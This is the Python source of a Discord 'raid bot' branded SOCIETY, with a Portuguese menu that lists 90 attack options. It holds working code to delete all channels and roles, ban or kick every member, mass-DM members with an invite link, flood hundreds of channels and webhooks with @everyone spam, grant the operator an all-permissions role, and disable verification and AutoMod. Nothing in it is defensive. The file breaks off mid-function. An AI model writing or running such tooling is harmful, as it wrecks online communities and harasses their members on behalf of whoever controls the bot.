import discord
from discord.ext import commands
import asyncio
import aiohttp
import os
from dotenv import load_dotenv
from flask import Flask
from threading import Thread

app = Flask('')

@app.route('/')
def home():
    return "SOCIETY RAID BOT ONLINE"

def run_web():
    port = int(os.getenv('PORT', 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run_web)
    t.daemon = True
    t.start()

load_dotenv()
TOKEN = os.getenv('TOKEN')

gifs = [
    "https://cdn.discordapp.com/attachments/1509314079527796766/1511420199272845403/lv_0_20260602130520.gif?ex=6a23af00&is=6a225d80&hm=906cb243045b4da5b662c7c9ad342f7a551e427271d97ac01b8c958efd9643ce&",
    "https://media.discordapp.net/attachments/1461526422626635866/1510041880606281799/sctyhell.png?ex=6a23f157&is=6a229fd7&hm=45121490dcdb36b4929c83e6146233c9e2ed04a3a04d562e174b38164afe7a6f&=&format=webp&quality=lossless&width=1567&height=627",
    "https://images-ext-1.discordapp.net/external/qBBYO1Pe_9AFo9iHso5BGNHPHbiOHSDdJqGxRgMJ0t4/https/media.tenor.com/0YarlQib6MwAAAPo/mandela-catalogue-alternate.mp4"
]

nomes_canais = [
    "SOCIETY PASSOU AQUI",
    "PERDEU SERVE RANDOLA",
    "CHORA NN BUT KSKSKS"
]

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True
bot = commands.Bot(command_prefix='!', intents=intents)

user_sessions = {}

@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Streaming(name=".    Scty", url="https://www.twitch.tv/society"))
    print(f'Bot {bot.user} ONLINE!')
    print(f'RAID MODE ACTIVATED')

def get_menu_page(page):
    if page == 1:
        return """```
SOCIETY RAID BOT V0.0.0

MENU DE OPCOES - PAGINA 1/3

[1] Nuke Complete           [2] Create Channels
[3] Spam Channels           [4] Webhook Spam
[5] Kick All                [6] Ban All
[7] Create Roles            [8] Get Admin
[9] Change Server           [10] DM All
[11] Delete Emojis          [12] Mass Mention
[13] Spam Reactions         [14] Delete All Roles
[15] Rename Members         [16] Mass Nick Change
[17] Create Threads         [18] Delete Webhooks
[19] Spam Voice Channels    [20] Remove Invites
[21] Clear Messages         [22] Pin Spam
[23] Create Categories      [24] Rename Channels
[25] Timeout All            [26] Server Template
[27] Spam Events            [28] Forum Spam
[29] Remove Integrations    [30] Max Channels

Digite 'next' proxima | [99] AUTO RAID
`````"""
    elif page == 2:
        return """```
SOCIETY RAID BOT V0.0.0

MENU DE OPCOES - PAGINA 2/3

[31] Max Roles              [32] Delete Stickers
[33] Deafen All             [34] Mute All
[35] Disconnect Voice       [36] Spam Stage Channels
[37] Clone Server           [38] Mass Unban
[39] Spam Invites           [40] Create Forums
[41] Role Spam              [42] Lock Channels
[43] Remove Reactions       [44] Spam Embeds
[45] Change Region          [46] Create Emojis
[47] Slowmode Max           [48] Slowmode Off
[49] Thread Spam            [50] Archive Threads
[51] Purge All              [52] Typing Spam
[53] Edit All Messages      [54] Role Colors
[55] Channel Topics         [56] Spam Nicks
[57] Banner Spam            [58] Splash Spam
[59] Remove Discovery       [60] Disable Community

Digite 'next' ou 'back' | [99] AUTO RAID
````"""
    elif page == 3:
        return """```
SOCIETY RAID BOT V0.0.0

MENU DE OPCOES - PAGINA 3/3

[61] Remove Verification    [62] Delete Rules
[63] Announcement Spam      [64] Disable AutoMod
[65] Remove Welcome         [66] Remove Boosts
[67] Prune Members          [68] Mass Move Voice
[69] Voice Spam             [70] Disable Widget
[71] Clear Insights         [72] Audit Spam
[73] Sticker Spam           [74] Soundboard Spam
[75] Forum Tags Spam        [76] Archive All
[77] Notification Spam      [78] Remove Guide
[79] Remove Features        [80] Reaction Spam
[81] Animated Banner        [82] Discovery Spam
[83] Remove Onboarding      [84] Remove Safety
[85] Vanity URL Spam        [86] Fake Boost
[87] Region Spam            [88] AFK Spam
[89] System Msg Spam        [90] Total Destruction

Digite 'back' | [99] AUTO RAID
```"""

@bot.command()
async def menu(ctx):
    try:
        await ctx.message.delete()
    except:
        pass
    
    try:
        dm = await ctx.author.send(get_menu_page(1))
        user_sessions[ctx.author.id] = {'guild': ctx.guild, 'dm_channel': dm.channel, 'page': 1}
        print(f"Menu enviado para {ctx.author.name}")
    except discord.Forbidden:
        try:
            await ctx.send(f"{ctx.author.mention} Nao consegui te enviar DM! Ative suas DMs.", delete_after=10)
        except:
            pass
    except Exception as e:
        print(f"Erro ao enviar DM: {e}")

@bot.event
async def on_message(message):
    if message.author.bot:
        return
    
    await bot.process_commands(message)
    
    if message.author.id in user_sessions and isinstance(message.channel, discord.DMChannel):
        session = user_sessions[message.author.id]
        guild = session['guild']
        opcao = message.content.strip().lower()
        
        if opcao == "next":
            if session['page'] < 3:
                session['page'] += 1
                await message.channel.send(get_menu_page(session['page']))
            else:
                await message.channel.send("```Ultima pagina!```")
            return
        
        elif opcao == "back":
            if session['page'] > 1:
                session['page'] -= 1
                await message.channel.send(get_menu_page(session['page']))
            else:
                await message.channel.send("```Primeira pagina!```")
            return
        
        opcao = message.content.strip()
        
        banner = "SOCIETY RAID TEAM - SERVIDOR DESTRUIDO"
        art = "SOCIETY PASSOU AQUI - PERDEU SERVE"
        
        if opcao == "1":
            await message.channel.send("```Executando NUKE...```")
            asyncio.create_task(nuke(guild, banner, art, gifs))
            del user_sessions[message.author.id]
        elif opcao == "2":
            await message.channel.send("```Criando 500 canais...```")
            asyncio.create_task(criar_canais_massa(guild, banner, art, gifs))
            del user_sessions[message.author.id]
        elif opcao == "3":
            await message.channel.send("```Spammando canais...```")
            asyncio.create_task(spam_canais_existentes(guild, banner, art, gifs))
            del user_sessions[message.author.id]
        elif opcao == "4":
            await message.channel.send("```Webhook spam...```")
            asyncio.create_task(webhook_spam(guild, banner, art, gifs))
            del user_sessions[message.author.id]
        elif opcao == "5":
            await message.channel.send("```Kickando todos...```")
            asyncio.create_task(kick_all(guild))
            del user_sessions[message.author.id]
        elif opcao == "6":
            await message.channel.send("```Banindo todos...```")
            asyncio.create_task(ban_all(guild))
            del user_sessions[message.author.id]
        elif opcao == "7":
            await message.channel.send("```Criando cargos...```")
            asyncio.create_task(criar_cargos_loop(guild))
            del user_sessions[message.author.id]
        elif opcao == "8":
            await message.channel.send("```Pegando admin...```")
            asyncio.create_task(get_admin(guild, message.author))
            del user_sessions[message.author.id]
        elif opcao == "9":
            await message.channel.send("```Alterando servidor...```")
            asyncio.create_task(alterar_servidor(guild))
            del user_sessions[message.author.id]
        elif opcao == "10":
            await message.channel.send("```DM em massa...```")
            asyncio.create_task(enviar_dm_massa(guild))
            del user_sessions[message.author.id]
        elif opcao == "11":
            await message.channel.send("```Deletando emojis...```")
            asyncio.create_task(delete_emojis(guild))
            del user_sessions[message.author.id]
        elif opcao == "12":
            await message.channel.send("```Mass mention...```")
            asyncio.create_task(mass_mention(guild))
            del user_sessions[message.author.id]
        elif opcao == "13":
            await message.channel.send("```Spam reactions...```")
            asyncio.create_task(spam_reactions(guild))
            del user_sessions[message.author.id]
        elif opcao == "14":
            await message.channel.send("```Deletando cargos...```")
            asyncio.create_task(deletar_cargos(guild))
            del user_sessions[message.author.id]
        elif opcao == "15":
            await message.channel.send("```Renomeando membros...```")
            asyncio.create_task(rename_members(guild))
            del user_sessions[message.author.id]
        elif opcao == "16":
            await message.channel.send("```Mass nick...```")
            asyncio.create_task(mass_nick(guild))
            del user_sessions[message.author.id]
        elif opcao == "17":
            await message.channel.send("```Criando threads...```")
            asyncio.create_task(create_threads(guild))
            del user_sessions[message.author.id]
        elif opcao == "18":
            await message.channel.send("```Deletando webhooks...```")
            asyncio.create_task(delete_webhooks(guild))
            del user_sessions[message.author.id]
        elif opcao == "19":
            await message.channel.send("```Spam voice...```")
            asyncio.create_task(spam_voice_channels(guild))
            del user_sessions[message.author.id]
        elif opcao == "20":
            await message.channel.send("```Removendo convites...```")
            asyncio.create_task(remove_invites(guild))
            del user_sessions[message.author.id]
        elif opcao == "21":
            await message.channel.send("```Limpando mensagens...```")
            asyncio.create_task(clear_messages(guild))
            del user_sessions[message.author.id]
        elif opcao == "22":
            await message.channel.send("```Pin spam...```")
            asyncio.create_task(pin_spam(guild))
            del user_sessions[message.author.id]
        elif opcao == "23":
            await message.channel.send("```Criando categorias...```")
            asyncio.create_task(create_categories(guild))
            del user_sessions[message.author.id]
        elif opcao == "24":
            await message.channel.send("```Renomeando canais...```")
            asyncio.create_task(rename_channels(guild))
            del user_sessions[message.author.id]
        elif opcao == "25":
            await message.channel.send("```Timeout all...```")
            asyncio.create_task(timeout_all(guild))
            del user_sessions[message.author.id]
        elif opcao == "26":
            await message.channel.send("```Template...```")
            asyncio.create_task(server_template(guild))
            del user_sessions[message.author.id]
        elif opcao == "27":
            await message.channel.send("```Spam events...```")
            asyncio.create_task(spam_events(guild))
            del user_sessions[message.author.id]
        elif opcao == "28":
            await message.channel.send("```Forum spam...```")
            asyncio.create_task(forum_spam(guild))
            del user_sessions[message.author.id]
        elif opcao == "29":
            await message.channel.send("```Remove integrations...```")
            asyncio.create_task(remove_integrations(guild))
            del user_sessions[message.author.id]
        elif opcao == "30":
            await message.channel.send("```Max channels...```")
            asyncio.create_task(max_channels(guild, banner, art, gifs))
            del user_sessions[message.author.id]
        elif opcao == "31":
            await message.channel.send("```Max roles...```")
            asyncio.create_task(max_roles(guild))
            del user_sessions[message.author.id]
        elif opcao == "32":
            await message.channel.send("```Delete stickers...```")
            asyncio.create_task(delete_stickers(guild))
            del user_sessions[message.author.id]
        elif opcao == "33":
            await message.channel.send("```Deafen all...```")
            asyncio.create_task(deafen_all(guild))
            del user_sessions[message.author.id]
        elif opcao == "34":
            await message.channel.send("```Mute all...```")
            asyncio.create_task(mute_all(guild))
            del user_sessions[message.author.id]
        elif opcao == "35":
            await message.channel.send("```Disconnect voice...```")
            asyncio.create_task(disconnect_voice(guild))
            del user_sessions[message.author.id]
        elif opcao == "36":
            await message.channel.send("```Spam stage...```")
            asyncio.create_task(spam_stage_channels(guild))
            del user_sessions[message.author.id]
        elif opcao == "37":
            await message.channel.send("```Clone server...```")
            asyncio.create_task(clone_server(guild))
            del user_sessions[message.author.id]
        elif opcao == "38":
            await message.channel.send("```Mass unban...```")
            asyncio.create_task(mass_unban(guild))
            del user_sessions[message.author.id]
        elif opcao == "39":
            await message.channel.send("```Spam invites...```")
            asyncio.create_task(spam_invites(guild))
            del user_sessions[message.author.id]
        elif opcao == "40":
            await message.channel.send("```Create forums...```")
            asyncio.create_task(create_forums(guild))
            del user_sessions[message.author.id]
        elif opcao == "41":
            await message.channel.send("```Role spam...```")
            asyncio.create_task(role_spam(guild))
            del user_sessions[message.author.id]
        elif opcao == "42":
            await message.channel.send("```Lock channels...```")
            asyncio.create_task(lock_channels(guild))
            del user_sessions[message.author.id]
        elif opcao == "43":
            await message.channel.send("```Remove reactions...```")
            asyncio.create_task(remove_reactions(guild))
            del user_sessions[message.author.id]
        elif opcao == "44":
            await message.channel.send("```Spam embeds...```")
            asyncio.create_task(spam_embeds(guild))
            del user_sessions[message.author.id]
        elif opcao == "45":
            await message.channel.send("```Change region...```")
            asyncio.create_task(change_region(guild))
            del user_sessions[message.author.id]
        elif opcao == "46":
            await message.channel.send("```Create emojis...```")
            asyncio.create_task(create_emojis(guild))
            del user_sessions[message.author.id]
        elif opcao == "47":
            await message.channel.send("```Slowmode max...```")
            asyncio.create_task(slowmode_max(guild))
            del user_sessions[message.author.id]
        elif opcao == "48":
            await message.channel.send("```Slowmode off...```")
            asyncio.create_task(slowmode_off(guild))
            del user_sessions[message.author.id]
        elif opcao == "49":
            await message.channel.send("```Thread spam...```")
            asyncio.create_task(thread_spam(guild))
            del user_sessions[message.author.id]
        elif opcao == "50":
            await message.channel.send("```Archive threads...```")
            asyncio.create_task(archive_threads(guild))
            del user_sessions[message.author.id]
        elif opcao == "51":
            await message.channel.send("```Purge all...```")
            asyncio.create_task(purge_all(guild))
            del user_sessions[message.author.id]
        elif opcao == "52":
            await message.channel.send("```Typing spam...```")
            asyncio.create_task(typing_spam(guild))
            del user_sessions[message.author.id]
        elif opcao == "53":
            await message.channel.send("```Edit messages...```")
            asyncio.create_task(edit_messages(guild))
            del user_sessions[message.author.id]
        elif opcao == "54":
            await message.channel.send("```Role colors...```")
            asyncio.create_task(role_colors(guild))
            del user_sessions[message.author.id]
        elif opcao == "55":
            await message.channel.send("```Channel topics...```")
            asyncio.create_task(channel_topics(guild))
            del user_sessions[message.author.id]
        elif opcao == "56":
            await message.channel.send("```Spam nicks...```")
            asyncio.create_task(spam_nicks(guild))
            del user_sessions[message.author.id]
        elif opcao == "57":
            await message.channel.send("```Banner spam...```")
            asyncio.create_task(banner_spam(guild))
            del user_sessions[message.author.id]
        elif opcao == "58":
            await message.channel.send("```Splash spam...```")
            asyncio.create_task(splash_spam(guild))
            del user_sessions[message.author.id]
        elif opcao == "59":
            await message.channel.send("```Remove discovery...```")
            asyncio.create_task(remove_discovery(guild))
            del user_sessions[message.author.id]
        elif opcao == "60":
            await message.channel.send("```Disable community...```")
            asyncio.create_task(disable_community(guild))
            del user_sessions[message.author.id]
        elif opcao == "61":
            await message.channel.send("```Remove verification...```")
            asyncio.create_task(remove_verification(guild))
            del user_sessions[message.author.id]
        elif opcao == "62":
            await message.channel.send("```Delete rules...```")
            asyncio.create_task(delete_rules(guild))
            del user_sessions[message.author.id]
        elif opcao == "63":
            await message.channel.send("```Announcement spam...```")
            asyncio.create_task(announcement_spam(guild))
            del user_sessions[message.author.id]
        elif opcao == "64":
            await message.channel.send("```Disable automod...```")
            asyncio.create_task(disable_automod(guild))
            del user_sessions[message.author.id]
        elif opcao == "65":
            await message.channel.send("```Remove welcome...```")
            asyncio.create_task(remove_welcome(guild))
            del user_sessions[message.author.id]
        elif opcao == "66":
            await message.channel.send("```Remove boosts...```")
            asyncio.create_task(remove_boosts(guild))
            del user_sessions[message.author.id]
        elif opcao == "67":
            await message.channel.send("```Prune members...```")
            asyncio.create_task(prune_members(guild))
            del user_sessions[message.author.id]
        elif opcao == "68":
            await message.channel.send("```Mass move voice...```")
            asyncio.create_task(mass_move_voice(guild))
            del user_sessions[message.author.id]
        elif opcao == "69":
            await message.channel.send("```Voice spam...```")
            asyncio.create_task(voice_spam(guild))
            del user_sessions[message.author.id]
        elif opcao == "70":
            await message.channel.send("```Disable widget...```")
            asyncio.create_task(disable_widget(guild))
            del user_sessions[message.author.id]
        elif opcao == "71":
            await message.channel.send("```Clear insights...```")
            asyncio.create_task(clear_insights(guild))
            del user_sessions[message.author.id]
        elif opcao == "72":
            await message.channel.send("```Audit spam...```")
            asyncio.create_task(audit_spam(guild))
            del user_sessions[message.author.id]
        elif opcao == "73":
            await message.channel.send("```Sticker spam...```")
            asyncio.create_task(sticker_spam(guild))
            del user_sessions[message.author.id]
        elif opcao == "74":
            await message.channel.send("```Soundboard spam...```")
            asyncio.create_task(soundboard_spam(guild))
            del user_sessions[message.author.id]
        elif opcao == "75":
            await message.channel.send("```Forum tags spam...```")
            asyncio.create_task(forum_tags_spam(guild))
            del user_sessions[message.author.id]
        elif opcao == "76":
            await message.channel.send("```Archive all...```")
            asyncio.create_task(archive_all(guild))
            del user_sessions[message.author.id]
        elif opcao == "77":
            await message.channel.send("```Notification spam...```")
            asyncio.create_task(notification_spam(guild))
            del user_sessions[message.author.id]
        elif opcao == "78":
            await message.channel.send("```Remove guide...```")
            asyncio.create_task(remove_guide(guild))
            del user_sessions[message.author.id]
        elif opcao == "79":
            await message.channel.send("```Remove features...```")
            asyncio.create_task(remove_features(guild))
            del user_sessions[message.author.id]
        elif opcao == "80":
            await message.channel.send("```Reaction spam...```")
            asyncio.create_task(reaction_spam(guild))
            del user_sessions[message.author.id]
        elif opcao == "81":
            await message.channel.send("```Animated banner...```")
            asyncio.create_task(animated_banner(guild))
            del user_sessions[message.author.id]
        elif opcao == "82":
            await message.channel.send("```Discovery spam...```")
            asyncio.create_task(discovery_spam(guild))
            del user_sessions[message.author.id]
        elif opcao == "83":
            await message.channel.send("```Remove onboarding...```")
            asyncio.create_task(remove_onboarding(guild))
            del user_sessions[message.author.id]
        elif opcao == "84":
            await message.channel.send("```Remove safety...```")
            asyncio.create_task(remove_safety(guild))
            del user_sessions[message.author.id]
        elif opcao == "85":
            await message.channel.send("```Vanity spam...```")
            asyncio.create_task(vanity_spam(guild))
            del user_sessions[message.author.id]
        elif opcao == "86":
            await message.channel.send("```Fake boost...```")
            asyncio.create_task(fake_boost(guild))
            del user_sessions[message.author.id]
        elif opcao == "87":
            await message.channel.send("```Region spam...```")
            asyncio.create_task(region_spam(guild))
            del user_sessions[message.author.id]
        elif opcao == "88":
            await message.channel.send("```AFK spam...```")
            asyncio.create_task(afk_spam(guild))
            del user_sessions[message.author.id]
        elif opcao == "89":
            await message.channel.send("```System msg spam...```")
            asyncio.create_task(system_msg_spam(guild))
            del user_sessions[message.author.id]
        elif opcao == "90":
            await message.channel.send("```TOTAL DESTRUCTION...```")
            asyncio.create_task(total_destruction(guild, banner, art, gifs))
            del user_sessions[message.author.id]
        elif opcao == "99":
            await message.channel.send("```AUTO RAID...```")
            asyncio.create_task(auto_raid(guild, banner, art, gifs))
            del user_sessions[message.author.id]

async def total_destruction(guild, banner, art, gifs):
    tasks = [
        deletar_canais(guild),
        deletar_cargos(guild),
        enviar_dm_massa(guild),
        alterar_servidor(guild),
        criar_cargos_loop(guild),
        criar_canais_massa(guild, banner, art, gifs),
        ban_all(guild),
        delete_emojis(guild),
        delete_stickers(guild),
        timeout_all(guild),
        max_channels(guild, banner, art, gifs),
        max_roles(guild)
    ]
    for task in tasks:
        asyncio.create_task(task)

async def nuke(guild, banner, art, gifs):
    asyncio.create_task(deletar_canais(guild))
    asyncio.create_task(deletar_cargos(guild))
    asyncio.create_task(alterar_servidor(guild))
    asyncio.create_task(enviar_dm_massa(guild))
    asyncio.create_task(criar_cargos_loop(guild))
    asyncio.create_task(criar_canais_massa(guild, banner, art, gifs))

async def auto_raid(guild, banner, art, gifs):
    tasks = [
        deletar_canais(guild),
        deletar_cargos(guild),
        enviar_dm_massa(guild),
        alterar_servidor(guild),
        criar_cargos_loop(guild),
        criar_canais_massa(guild, banner, art, gifs),
        ban_all(guild),
        delete_emojis(guild)
    ]
    for task in tasks:
        asyncio.create_task(task)

async def deletar_canais(guild):
    for canal in guild.channels:
        try:
            await canal.delete()
        except:
            pass

async def deletar_cargos(guild):
    for cargo in guild.roles:
        try:
            if cargo.name != "@everyone":
                await cargo.delete()
        except:
            pass

async def alterar_servidor(guild):
    try:
        await guild.edit(name="SOCIETY PASSOU AQUI")
        async with aiohttp.ClientSession() as session:
            async with session.get("https://i.pinimg.com/736x/68/3f/f4/683ff496dfb2579566c575f61ef36c5a.jpg") as resp:
                if resp.status == 200:
                    image_data = await resp.read()
                    await guild.edit(icon=image_data)
    except:
        pass

async def enviar_dm_massa(guild):
    membros = [member for member in guild.members if not member.bot]
    mensagem_dm = "SEU SERVIDOR FOI RAIDADO BY SOCIETY\n\nEntre: https://discord.gg/WJ76QgRA"
    for membro in membros:
        try:
            await membro.send(mensagem_dm)
        except:
            pass

async def criar_cargos_loop(guild):
    for i in range(200):
        try:
            await guild.create_role(name="SOCIETY ESTEVE AQUI")
        except:
            pass

async def criar_canais_massa(guild, banner, art, gifs):
    for i in range(500):
        try:
            nome_canal = nomes_canais[i % len(nomes_canais)]
            novo_canal = await guild.create_text_channel(nome_canal)
            asyncio.create_task(spam_messages(novo_canal, banner, art, gifs))
        except:
            pass

async def spam_canais_existentes(guild, banner, art, gifs):
    for canal in guild.text_channels:
        asyncio.create_task(spam_messages(canal, banner, art, gifs))

async def webhook_spam(guild, banner, art, gifs):
    for canal in guild.text_channels:
        try:
            webhook = await canal.create_webhook(name="SOCIETY")
            asyncio.create_task(spam_webhook(webhook, banner, art, gifs))
        except:
            pass

async def spam_webhook(webhook, banner, art, gifs):
    try:
        for i in range(100):
            await webhook.send(f"@everyone **{banner}**\n{art}\n{gifs[i % len(gifs)]}")
    except:
        pass

async def kick_all(guild):
    for member in [m for m in guild.members if not m.bot and m != guild.owner]:
        try:
            await member.kick(reason="SOCIETY")
        except:
            pass

async def ban_all(guild):
    for member in [m for m in guild.members if not m.bot and m != guild.owner]:
        try:
            await member.ban(reason="SOCIETY")
        except:
            pass

async def get_admin(guild, user):
    try:
        role = await guild.create_role(name="SOCIETY ADMIN", permissions=discord.Permissions.all())
        member = guild.get_member(user.id)
        if member:
            await member.add_roles(role)
    except:
        pass

async def delete_emojis(guild):
    for emoji in guild.emojis:
        try:
            await emoji.delete()
        except:
            pass

async def mass_mention(guild):
    for canal in guild.text_channels:
        try:
            mentions = " ".join([m.mention for m in guild.members if not m.bot][:50])
            for _ in range(10):
                await canal.send(f"{mentions} SOCIETY")
        except:
            pass

async def spam_reactions(guild):
    for canal in guild.text_channels:
        try:
            async for msg in canal.history(limit=50):
                try:
                    await msg.add_reaction("💀")
                except:
                    pass
        except:
            pass

async def rename_members(guild):
    for member in guild.members:
        try:
            await member.edit(nick="SOCIETY")
        except:
            pass

async def mass_nick(guild):
    for member in guild.members:
        try:
            await member.edit(nick="SOCIETY")
        except:
            pass

async def create_threads(guild):
    for canal in guild.text_channels:
        try:
            for i in range(10):
                await canal.create_thread(name=f"SOCIETY {i}", type=discord.ChannelType.public_thread)
        except:
            pass

async def delete_webhooks(guild):
    for canal in guild.text_channels:
        try:
            for webhook in await canal.webhooks():
                await webhook.delete()
        except:
            pass

async def spam_voice_channels(guild):
    for i in range(50):
        try:
            await guild.create_voice_channel(f"SOCIETY {i}")
        except:
            pass

async def remove_invites(guild):
    try:
        for invite in await guild.invites():
            await invite.delete()
    except:
        pass

async def clear_messages(guild):
    for canal in guild.text_channels:
        try:
            await canal.purge(limit=1000)
        except:
            pass

async def pin_spam(guild):
    for canal in guild.text_channels:
        try:
            msg = await canal.send("SOCIETY")
            await msg.pin()
        except:
            pass

async def create_categories(guild):
    for i in range(50):
        try:
            await guild.create_category(f"SOCIETY {i}")
        except:
            pass

async def rename_channels(guild):
    for canal in guild.channels:
        try:
            await canal.edit(name="society")
        except:
            pass

async def server_template(guild):
    try:
        await guild.create_template(name="SOCIETY", description="RAIDADO")
    except:
        pass

async def forum_spam(guild):
    for canal in guild.forums:
        try:
            for i in range(20):
                await canal.create_thread(name=f"SOCIETY {i}", content="SOCIETY")
        except:
            pass

async def remove_integrations(guild):
    try:
        for integration in await guild.integrations():
            await integration.delete()
    except:
        pass

async def timeout_all(guild):
    from datetime import timedelta
    for member in guild.members:
        try:
            await member.timeout(timedelta(days=28))
        except:
            pass

async def spam_events(guild):
    from datetime import datetime, timedelta
    for i in range(10):
        try:
            start_time = datetime.now() + timedelta(days=i)
            await guild.create_scheduled_event(
                name=f"SOCIETY {i}",
                start_time=start_time,
                entity_type=discord.EntityType.external,
                privacy_level=discord.PrivacyLevel.guild_only,
                location="SOCIETY"
            )
        except:
            pass

async def delete_stickers(guild):
    for sticker in guild.stickers:
        try:
            await sticker.delete()
        except:
            pass

async def max_channels(guild, banner, art, gifs):
    for i in range(1000):
        try:
            await guild.create_text_channel(nomes_canais[i % len(nomes_canais)])
        except:
            break

async def max_roles(guild):
    for i in range(250):
        try:
            await guild.create_role(name=f"SOCIETY {i}")
        except:
            break

async def deafen_all(guild):
    for member in guild.members:
        try:
            if member.voice:
                await member.edit(deafen=True)
        except:
            pass

async def mute_all(guild):
    for member in guild.members:
        try:
            if member.voice:
                await member.edit(mute=True)
        except:
            pass

async def disconnect_voice(guild):
    for member in guild.members:
        try:
            if member.voice:
                await member.move_to(None)
        except:
            pass

async def spam_stage_channels(guild):
    for i in range(20):
        try:
            await guild.create_stage_channel(f"SOCIETY {i}")
        except:
            pass

async def clone_server(guild):
    try:
        template = await guild.create_template(name="SOCIETY")
        await template.sync()
    except:
        pass

async def mass_unban(guild):
    try:
        for ban in await guild.bans():
            await guild.unban(ban.user)
    except:
        pass

async def spam_invites(guild):
    for canal in guild.text_channels:
        try:
            for _ in range(10):
                invite = await canal.create_invite(max_age=0, max_uses=0)
                await canal.send(f"@everyone {invite.url}")
        except:
            pass

async def create_forums(guild):
    for i in range(10):
        try:
            await guild.create_forum(f"SOCIETY FORUM {i}")
        except:
            pass

async def role_spam(guild):
    for i in range(50):
        try:
            role = await guild.create_role(name=f"SOCIETY {i}")
            for member in guild.members[:10]:
                try:
                    await member.add_roles(role)
                except:
                    pass
        except:
            pass

async def lock_channels(guild):
    for canal in guild.text_channels:
        try:
            await canal.set_permissions(guild.default_role, send_messages=False)
        except:
            pass

async def remove_reactions(guild):
    for canal in guild.text_channels:
        try:
            async for msg in canal.history(limit=100):
                try:
                    await msg.clear_reactions()
                except:
                    pass
        except:
            pass

async def spam_embeds(guild):
    for canal in guild.text_channels:
        try:
            embed = discord.Embed(title="SOCIETY", description="RAIDADO", color=0xFF0000)
            for _ in range(20):
                await canal.send(embed=embed)
        except:
            pass

async def change_region(guild):
    try:
        await guild.edit(region=discord.VoiceRegion.brazil)
    except:
        pass

async def create_emojis(guild):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("https://i.pinimg.com/736x/68/3f/f4/683ff496dfb2579566c575f61ef36c5a.jpg") as resp:
                if resp.status == 200:
                    image = await resp.read()
                    for i in range(10):
                        await guild.create_custom_emoji(name=f"society{i}", image=image)
    except:
        pass

async def slowmode_max(guild):
    for canal in guild.text_channels:
        try:
            await canal.edit(slowmode_delay=21600)
        except:
            pass

async def slowmode_off(guild):
    for canal in guild.text_channels:
        try:
            await canal.edit(slowmode_delay=0)
        except:
            pass

async def thread_spam(guild):
    for canal in guild.text_channels:
        try:
            for i in range(20):
                await canal.create_thread(name=f"SOCIETY {i}", type=discord.ChannelType.public_thread)
        except:
            pass

async def archive_threads(guild):
    for canal in guild.text_channels:
        try:
            for thread in canal.threads:
                await thread.edit(archived=True)
        except:
            pass

async def purge_all(guild):
    for canal in guild.text_channels:
        try:
            await canal.purge(limit=None)
        except:
            pass

async def typing_spam(guild):
    for canal in guild.text_channels:
        try:
            for _ in range(50):
                await canal.trigger_typing()
                await asyncio.sleep(1)
        except:
            pass

async def edit_messages(guild):
    for canal in guild.text_channels:
        try:
            async for msg in canal.history(limit=50):
                if msg.author == guild.me:
                    await msg.edit(content="SOCIETY")
        except:
            pass

async def role_colors(guild):
    import random
    for role in guild.roles:
        try:
            await role.edit(color=discord.Color(random.randint(0, 0xFFFFFF)))
        except:
            pass

async def channel_topics(guild):
    for canal in guild.text_channels:
        try:
            await canal.edit(topic="SOCIETY PASSOU AQUI")
        except:
            pass

async def spam_nicks(guild):
    nicks = ["SOCIETY", "RAIDADO", "PERDEU"]
    for member in guild.members:
        try:
            import random
            await member.edit(nick=random.choice(nicks))
        except:
            pass

async def banner_spam(guild):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("https://i.pinimg.com/736x/68/3f/f4/683ff496dfb2579566c575f61ef36c5a.jpg") as resp:
                if resp.status == 200:
                    await guild.edit(banner=await resp.read())
    except:
        pass

async def splash_spam(guild):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("https://i.pinimg.com/736x/68/3f/f4/683ff496dfb2579566c575f61ef36c5a.jpg") as resp:
                if resp.status == 200:
                    await guild.edit(splash=await resp.read())
    except:
        pass

async def remove_discovery(guild):
    try:
        await guild.edit(discovery_splash=None)
    except:
        pass

async def disable_community(guild):
    try:
        await guild.edit(community=False)
    except:
        pass

async def remove_verification(guild):
    try:
        await guild.edit(verification_level=discord.VerificationLevel.none)
    except:
        pass

async def delete_rules(guild):
    try:
        if guild.rules_channel:
            await guild.rules_channel.delete()
    except:
        pass

async def announcement_spam(guild):
    for canal in guild.text_channels:
        try:
            if canal.type == discord.ChannelType.news:
                for _ in range(20):
                    msg = await canal.send("@everyone SOCIETY")
                    await msg.publish()
        except:
            pass

async def disable_automod(guild):
    try:
        for rule in await guild.fetch_automod_rules():
            await rule.delete()
    except:
        pass

async def remove_welcome(guild):
    try:
        await guild.edit(system_channel=None)
    except:
        pass

async def remove_boosts(guild):
    try:
        await guild.edit(premium_progress_bar_enabled=False)
    except:
        pass

async def prune_members(guild):
    try:
        await guild.prune_members(days=1)
    except:
        pass

async def mass_move_voice(guild):
    try:
        voice_channels = guild.voice_channels
        if len(voice_channels) >= 2:
            for member in guild.members:
                if member.voice:
                    await member.move_to(voice_channels[0] if member.voice.channel != voice_channels[0] else voice_channels[1])
    except:
        pass

async def voice_spam(guild):
    for i in range(30):
        try:
            await guild.create_voice_channel(f"SOCIETY VOICE {i}")
        except:
            pass

async def disable_widget(guild):
    try:
        await guild.edit(widget_enabled=False)
    except:
        pass

async def clear_insights(guild):
    pass

async def audit_spam(guild):
    for i in range(50):
        try:
            await guild.edit(name=f"SOCIETY {i}")
        except:
            pass

async def sticker_spam(guild):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("https://i.pinimg.com/736x/68/3f/f4/683ff496dfb2579566c575f61ef36c5a.jpg") as resp:
                if resp.status == 200:
                    image = await resp.read()
                    for i in range(5):
                        await guild.create_sticker(name=f"SOCIETY {i}", description="RAIDADO", emoji="💀", file=discord.File(image, filename="sticker.png"))
    except:
        pass

async def soundboard_spam(guild):
    pass

async def forum_tags_spam(guild):
    for forum in guild.forums:
        try:
            for i in range(10):
                await forum.create_tag(name=f"SOCIETY {i}")
        except:
            pass

async def archive_all(guild):
    for canal in guild.text_channels:
        try:
            for thread in canal.threads:
                await thread.edit(archived=True)
        except:
            pass

async def notification_spam(guild):
    try:
        await guild.edit(default_notifications=discord.NotificationLevel.all_messages)
    except:
        pass

async def remove_guide(guild):
    try:
        await guild.edit(community=False)
    except:
        pass

async def remove_features(guild):
    try:
        await guild.edit(features=[])
    except:
        pass

async def reaction_spam(guild):
